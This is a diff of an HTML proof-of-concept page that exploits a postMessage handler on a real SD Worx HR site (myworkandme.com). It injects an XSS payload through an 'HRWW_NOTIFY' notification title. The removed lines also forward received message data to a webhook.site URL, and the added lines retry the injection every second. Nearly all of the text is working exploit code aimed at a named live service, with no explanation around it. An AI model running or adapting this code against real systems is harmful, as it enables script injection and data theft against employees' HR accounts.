@@ -1,31 +1,25 @@
-<!DOCTYPE html>
-  <html>
-  <body>
-    <button onclick="attack()">Click to login to SD Worx HR</button>
-    <script>
-      window.addEventListener('message', function(e) {
-        if (e.origin === 'https://www.myworkandme.com') {
-          fetch('https://webhook.site/ac45a955-b680-4e3b-ae03-2119a0e5ce54?c=' + encodeURIComponent(e.data));
+<!doctype html>
+<meta charset="utf-8">
+<title>HRWW_NOTIFY reliable validation</title>
+<button id="attack">Open authenticated HR shell</button>
+<script>
+document.getElementById('attack').onclick = () => {
+  const win = window.open('https://www.myworkandme.com/ebloxhr/hrwwevo/', '_blank');
+  let attempts = 0;
+  const timer = setInterval(() => {
+    if (!win || win.closed || attempts++ >= 30) return clearInterval(timer);
+    win.postMessage({
+      headers: {},
+      message: {
+        type: 'HRWW_NOTIFY',
+        notification: {
+          type: 'warning',
+          title: "<img src=x onerror=\"alert('HRWW_NOTIFY_XSS')\">",
+          messages: [],
+          solutions: null
         }
-      });
-
-      function attack() {
-        var win = window.open('https://www.myworkandme.com/ebloxhr/hrwwevo/', '_blank');
-        setTimeout(function () {
-          win.postMessage({
-            headers: {},
-            message: {
-              type: 'HRWW_NOTIFY',
-              notification: {
-                type: 'error',
-                title: "<img src=x onerror=\"alert('HRWW_NOTIFY_XSS')\">",
-                messages: [],
-                solutions: null
-              }
-            }
-          }, '*');
-        }, 5000);
       }
-    </script>
-  </body>
-  </html>
+    }, '*');
+  }, 1000);
+};
+</script>
